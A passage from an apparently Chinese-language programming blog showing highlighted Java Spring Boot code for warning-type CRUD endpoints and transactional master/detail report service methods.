function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"新增预警类型出现异常:{}"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>EXCEPTION<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"新增预警类型出现异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 删除预警类型     *     * @param id:     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/delWarningType/{id}"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"删除预警类型"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"根据id删除预警类型"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> <span class="token function">delWarningType</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> Integer id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"删除预警类型,请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span> <span class="token string">"操作失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">boolean</span> bRtn <span class="token operator">=</span> warningTypeService<span class="token punctuation">.</span><span class="token function">delWarningType</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bRtn<span class="token punctuation">)</span> <span class="token punctuation">{</span>                resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"删除预警类型出现异常:{}"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>EXCEPTION<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"删除预警类型出现异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 修改预警类型     *     * @param warningTypeUpdBody:     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/updWarningType"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"修改预警类型"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"根据id修改预警类型"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> <span class="token function">updateWarningType</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token annotation punctuation">@Valid</span> WarningTypeUpdBody warningTypeUpdBody<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"修改预警类型,请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>warningTypeUpdBody<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>Boolean<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span> <span class="token string">"操作失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            WarningType warningType <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WarningType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>warningTypeUpdBody<span class="token punctuation">,</span> warningType<span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setUpdateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setUpdateUserName</span><span class="token punctuation">(</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            warningType<span class="token punctuation">.</span><span class="token function">setUpdateUserId</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">toIntExact</span><span class="token punctuation">(</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> bRtn <span class="token operator">=</span> warningTypeService<span class="token punctuation">.</span><span class="token function">updateWarningType</span><span class="token punctuation">(</span>warningType<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bRtn<span class="token punctuation">)</span> <span class="token punctuation">{</span>                resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"修改成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"修改预警类型出现异常:{}"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>EXCEPTION<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"修改预警类型出现异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 根据id查询预警类型     *     * @param id:     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/findWarningTypeById/{id}"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"根据id查询预警类型"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"根据id查询预警类型"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>Optional<span class="token operator">&lt;</span>WarningType<span class="token operator">>></span> <span class="token function">findWarningTypeById</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> Integer id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"根据id查询预警类型,请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>Optional<span class="token operator">&lt;</span>WarningType<span class="token operator">>></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span> <span class="token string">"操作失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Optional<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> warningTypeById <span class="token operator">=</span> warningTypeService<span class="token punctuation">.</span><span class="token function">findWarningTypeById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>warningTypeById<span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"根据id查询预警类型成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>warningTypeById<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>                resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"根据id查询预警类型为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"根据id查询预警类型出现异常:{}"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>EXCEPTION<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"根据id查询预警类型出现异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 查询所有预警类型     *     * @param :     * @return     */</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/getWarningTypeList"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"条件查询预警类型"</span><span class="token punctuation">,</span> notes <span class="token operator">=</span> <span class="token string">"按条件查询预警类型,默认排序：主键"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>WarningType<span class="token operator">>></span> <span class="token function">getWarningTypeList</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> WarningTypeFindByKey baseRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"条件查询预警类型, 请求参数:{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>baseRequest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>WarningType<span class="token operator">>></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span> <span class="token string">"操作失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            PageInfo<span class="token operator">&lt;</span>WarningType<span class="token operator">></span> pageInfo <span class="token operator">=</span> warningTypeService<span class="token punctuation">.</span><span class="token function">getWarningTypeList</span><span class="token punctuation">(</span>baseRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>pageInfo<span class="token punctuation">.</span><span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> other <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//获取总记录数</span>            other<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"total"</span><span class="token punctuation">,</span> pageInfo<span class="token punctuation">.</span><span class="token function">getTotal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//获取总页数</span>            other<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"pages"</span><span class="token punctuation">,</span> pageInfo<span class="token punctuation">.</span><span class="token function">getPages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setOther</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"条件查询预警类型出现异常:{}"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>EXCEPTION<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"条件查询预警类型出现异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h2 id="多表操作Service（一对多的主从表）"><a href="#多表操作Service（一对多的主从表）" class="headerlink" title="多表操作Service（一对多的主从表）"></a>多表操作Service（一对多的主从表）</h2><h3 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>rollbackFor <span class="token operator">=</span> Exception<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">addTCustomReport</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Valid</span> TCustomReportAdd customReportAdd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        TCustomReport tCustomReport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCustomReport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>customReportAdd<span class="token punctuation">,</span> tCustomReport<span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IJWTInfo jwtInfo <span class="token operator">=</span> <span class="token punctuation">(</span>IJWTInfo<span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"JWTInfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportCreateUserId</span><span class="token punctuation">(</span>jwtInfo<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportCreateUserName</span><span class="token punctuation">(</span>jwtInfo<span class="token punctuation">.</span><span class="token function">getUniqueName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> tCustomReportMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>tCustomReport<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>TCustomReportDetailAdd<span class="token operator">></span> tCustomReportAddList <span class="token operator">=</span> customReportAdd<span class="token punctuation">.</span><span class="token function">getTCustomReportDetailAdds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>TCustomReportDetailAdd tCustomReportDetailAdd <span class="token operator">:</span> tCustomReportAddList<span class="token punctuation">)</span> <span class="token punctuation">{</span>                TCustomReportDetail tCustomReportDetail <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCustomReportDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>tCustomReportDetailAdd<span class="token punctuation">,</span> tCustomReportDetail<span class="token punctuation">)</span><span class="token punctuation">;</span>                tCustomReportDetail<span class="token punctuation">.</span><span class="token function">setReportId</span><span class="token punctuation">(</span>tCustomReport<span class="token punctuation">.</span><span class="token function">getReportId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                j <span class="token operator">=</span> tCustomReportDetailMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>tCustomReportDetail<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> j<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><pre class=" language-java"><code class="language-java"> <span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>rollbackFor <span class="token operator">=</span> Exception<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">updateTCustomReport</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Valid</span> TCustomReportUpddBody tCustomReportUpdBody<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        TCustomReport tCustomReport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCustomReport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>tCustomReportUpdBody<span class="token punctuation">,</span> tCustomReport<span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportUpdateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IJWTInfo jwtInfo <span class="token operator">=</span> <span class="token punctuation">(</span>IJWTInfo<span class="token punctuation">)</span> request<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"JWTInfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportUpdateUserId</span><span class="token punctuation">(</span>jwtInfo<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tCustomReport<span class="token punctuation">.</span><span class="token function">setReportUpdateUserName</span><span class="token punctuation">(</span>jwtInfo<span class="token punctuation">.</span><span class="token function">getUniqueName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> tCustomReportMapper<span class="token punctuation">.</span><span class="token function">updateByPrimaryKeySelective</span><span class="token punctuation">(</span>tCustomReport<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//先根据主表id删除子数据</span>            Example exampleDel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>TCustomReportDetail<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exampleDel<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"reportId"</span><span class="token punctuation">,</span>tCustomReportUpdBody<span class="token punctuation">.</span><span class="token function">getReportId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tCustomReportDetailMapper<span class="token punctuation">.</span><span class="token function">deleteByExample</span><span class="token punctuation">(</span>exampleDel<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//插入要修改的数据</span>            List<span class="token operator">&lt;</span>TCustomReportDetailAdd<span class="token operator">></span> tCustomReportUpdList <span class="token operator">=</span> tCustomReportUpdBody<span class="token punctuation">.</span><span class="token function">getTCustomReportDetailUpd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>TCustomReportDetailAdd tCustomReportDetailUpd <span class="token operator">:</span> tCustomReportUpdList<span class="token punctuation">)</span> <span class="token punctuation">{</span>                TCustomReportDetail tCustomReportDetail <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCustomReportDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>tCustomReportDetailUpd<span class="token punctuation">,</span> tCustomReportDetail<span class="token punctuation">)</span><span class="token punctuation">;</span>                tCustomReportDetail<span class="token punctuation">.</span><span class="token function">setReportId</span><span class="token punctuation">(</span>tCustomReportUpdBody<span class="token punctuation">.</span><span class="token function">getReportId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                j <span class="token operator">=</span> tCustomReportDetailMapper<span class="token punctuation">.</span><span class="token function">insertSelective</span><span class="token punctuation">(</span>tCustomReportDetail<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> j<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="根据id查询"><a href="#根据id查询" class="headerlink" title="根据id查询"></a>根据id查询</h3><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> TCustomReportFindByIdBody <span class="token function">findTCustomReportById</span><span class="token punctuation">(</span>Integer id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TCustomReport tCustomReport <span class="token operator">=</span> tCustomReportMapper<span class="token punctuation">.</span><span class="token function">selectByPrimaryKey</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        TCustomReportFindByIdBody tCustomReportFindByIdBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCustomReportFindByIdBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tCustomReport <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            BeanUtils<span class="token punctuation">.</span><span class="token function">copyProperties</span><span class="token punctuation">(</span>tCustomReport<span class="token punctuation">,</span> tCustomReportFindByIdBody<span class="token punctuation">)</span><span class="token punctuation">;</span>            Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>TCustomReportDetail<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"reportId"</span><span class="token punctuation">,</span> tCustomReport<span class="token punctuation">.</span><span class="token function">getReportId</span><span 